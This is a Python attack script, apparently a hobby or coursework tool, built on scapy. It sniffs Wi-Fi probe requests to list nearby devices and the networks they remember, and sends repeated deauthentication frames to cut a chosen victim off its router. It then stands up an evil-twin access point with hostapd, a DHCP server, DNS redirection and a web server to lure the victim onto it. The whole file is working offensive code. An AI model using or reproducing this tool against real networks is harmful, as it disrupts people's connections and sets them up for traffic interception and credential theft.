import netifaces
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, RadioTap, Dot11ProbeReq

network_list = {}

'''
scans all interfaces
'''


def iface_list():
    if_list = netifaces.interfaces()
    return if_list


'''
Set interface into monitor mode
'''


def monitorMode(iface):
    os.system("ifconfig " + iface + " down")
    os.system("iwconfig " + iface + " mode monitor")
    os.system("ifconfig " + iface + " up")


'''
sends deauth packets to selected user on selected network
'''


def perform_deauth(router, client, iface):
    pckt = RadioTap() / Dot11(addr1=client, addr2=router, addr3=router) / Dot11Deauth(reason=4)
    cli_to_ap_pckt = RadioTap() / Dot11(addr1=router, addr2=client, addr3=client) / Dot11Deauth(reason=7)

    print('Sending Deauth to ' + client + ' from ' + router)

    try:
        for i in range(100):
            sendp(pckt, inter=0.1, count=1, loop=0, iface=iface, verbose=0)
            sendp(cli_to_ap_pckt, inter=0.1, count=1, loop=0, iface=iface, verbose=0)
            print("\U0001F608")

    except Exception as e:
        print(f"error: {e}")


# define variables
clients = {}


# our packet handler
def packet_handler(p):
    global uni
    if p.haslayer(Dot11ProbeReq):
        mac = str(p.addr2)
        if p.haslayer(Dot11Elt):
            if p.ID == 0:
                ssid = p.info
                if mac not in clients.keys() and ssid != "":
                    clients[mac] = [ssid]
                elif mac in clients.keys() and ssid not in clients[mac]:
                    clients.get(mac).append(ssid)
                print(f"MAC:{mac} BSSID:{ssid}")


def start_sniffer(interface):
    os.system("clear")
    for channel in range(1, 13):
        os.system("iwconfig %s channel %d" % (interface, channel))
        sniff(iface=interface, timeout=5, prn=packet_handler)


if __name__ == '__main__':
    # Display all available interface
    user_iface = None

    print("Available interfaces:")
    if_list = iface_list()
    for i in range(0, len(if_list)):
        print(i + 1, if_list[i])
    flag = True
    while (flag):
        user_choice = input("Please pick an interface:\n ")
        while int(user_choice) < 1 or int(user_choice) > len(if_list):
            user_choice = input("Interface has to be in the range seen above\nPlease pick an interface from the "
                                "listed numbers")

        print(user_choice)
        user_iface = if_list[int(user_choice) - 1]

        print('Setting interface into monitor mode...\n')
        try:
            monitorMode(user_iface)
            flag = False
        except:
            print("Could not change interface mode to monitor.")

    # Sniffs for prob-reqs, display and pick user to attack
    print("Starting prob-req sniffing, it may take some time....")
    start_sniffer(user_iface)

    print("Available clients and known networks:")
    for key, value in clients.items():
        print(key, ' : ', value)

    target_client = input("please pick a client\n")
    target_ap = input("please pick a network to fake:\n")

    # setup fake ap
    apdconf_text = f"interface={user_iface}\n driver=nl80211\nssid={target_ap}\nhw_mode=g\nchannel=11\nmacaddr_acl=0" \
                   f"\nignore_broadcast_ssid=0\nauth_algs=1\nieee80211n=1\nwme_enabled=1 "
    text_file = open("hostapd.conf", "w")
    n = text_file.write(apdconf_text)
    text_file.close()

    print("----------------------starting services----------------")
    print("starting apache2 server\n")
    os.system("service apache2 start")
    print("apache2 web server is up\n\n ")

    print("starting dns server\n")
    os.system("service dnsmasq start")
    print("dns server is listening on port 53\n\n")

    print("modefiting the dns configeration\n")
    os.system("echo nameserver 127.0.0.1 > /etc/resolv.conf")
    print("dns routing is set\n\n")

    print(f"setting {user_iface} ip address and routing tables\n")
    os.system(f"ifconfig {user_iface} up 192.168.1.1 netmask 255.255.255.0")
    os.system("route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1")
    print("interface configured\n\n")

    print("starting dhcp server")
    os.system("dhcpd")
    print("dhcp server is up")

    print("creating a fake AP")
    os.system("hostapd hostapd.conf")

